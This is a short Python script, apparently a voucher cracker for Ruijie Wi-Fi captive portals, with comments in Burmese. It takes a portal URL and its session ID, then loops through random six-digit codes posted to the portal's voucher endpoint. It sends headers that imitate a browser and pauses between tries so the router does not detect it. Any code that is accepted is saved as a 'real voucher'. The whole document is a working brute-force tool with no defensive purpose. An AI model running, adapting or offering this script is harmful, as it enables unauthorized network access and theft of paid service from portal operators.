import requests
import random
import time
import os
import re

def clear(): os.system('clear')

def precision_attack():
    clear()
    print("\033[96mRUIJIE ANTI-FAKE CRACKER v13.0\033[0m")
    url = input("\033[93m[?] Paste Portal URL: \033[0m").strip()
    
    try:
        sid = re.search(r'sessionId=([a-zA-Z0-9_\-]+)', url).group(1)
        api_url = f"{url.split('index.html')[0]}api/auth/voucher/"
    except:
        print("URL Error!")
        return

    print("\033[92m[*] Engine Running... Searching for REAL codes.\033[0m\n")

    while True:
        code = "".join([str(random.randint(0, 9)) for _ in range(6)])
        
        try:
            # Browser နဲ့ တူအောင် Header တွေ ပိုထည့်ထားပါတယ်
            headers = {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
                "Content-Type": "application/json",
                "X-Requested-With": "XMLHttpRequest"
            }
            
            res = requests.post(api_url, 
                                json={"accessCode": code, "sessionId": sid, "apiVersion": 1}, 
                                headers=headers, timeout=10)
            
            data = res.json()
            # Router ရဲ့ Response ထဲက 'result' ကို သေချာစစ်ဆေးခြင်း
            # result 0 ဆိုမှသာ အင်တာနက် တကယ်ရတာမျိုး ဖြစ်တတ်ပါတယ်
            if res.status_code == 200 and data.get("result") == 0:
                print(f"\n\033[92m[✔] REAL VOUCHER FOUND: {code}\033[0m")
                with open("real_hits.txt", "a") as f: f.write(code + "\n")
                break
            else:
                # ညာနေတဲ့ ကုဒ်တွေကို ကျော်သွားပါမယ်
                print(f"\033[90m[*] Trying: {code} (Filtered Fake)\033[0m", end="\r")
            
            # Router ရိပ်မိမသွားအောင် အချိန်နည်းနည်း ပိုခြားပေးပါ
            time.sleep(2.5) 
            
        except KeyboardInterrupt: break
        except: time.sleep(5)

if __name__ == "__main__":
    precision_attack()
